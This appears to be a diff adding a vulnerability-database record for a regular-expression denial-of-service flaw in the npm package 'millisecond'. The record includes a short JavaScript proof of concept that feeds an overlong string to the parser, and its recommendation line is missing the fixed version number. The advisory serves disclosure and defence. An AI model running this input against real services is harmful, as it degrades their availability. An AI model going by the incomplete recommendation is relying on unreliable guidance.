@@ -1,0 +1,39 @@
+vulnerability_id: VCID-a2c4-y336-aaak
+aliases:
+  - GHSA-m489-xr35-fjxr
+  - GMS-2021-37
+summary: |
+  Regular Expression Denial of Service in millisecond
+  Versions of `millisecond` are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed. ## Proof of concept
+  ```
+  var ms = require('millisecond');
+  var genstr = function (len, chr) {
+   var result = "";
+   for (i=0; i<=len; i++) {
+   result = result + chr;
+   }
+
+   return result;
+  }
+
+  ms(genstr(process.argv[2], "5") + " minutea");
+  ``` ## Recommendation
+
+  Update to or later.
+severities:
+  - id: 705029
+    reference_id: 34298
+    scoring_system: cvssv3.1_qr
+    value: MODERATE
+    scoring_elements:
+references:
+  - id: 34296
+    url: https://github.com/unshiftio/millisecond/pull/4
+    reference_id:
+  - id: 34297
+    url: https://www.npmjs.com/advisories/59
+    reference_id:
+  - id: 34298
+    url: https://github.com/advisories/GHSA-m489-xr35-fjxr
+    reference_id: GHSA-m489-xr35-fjxr
+weaknesses: []
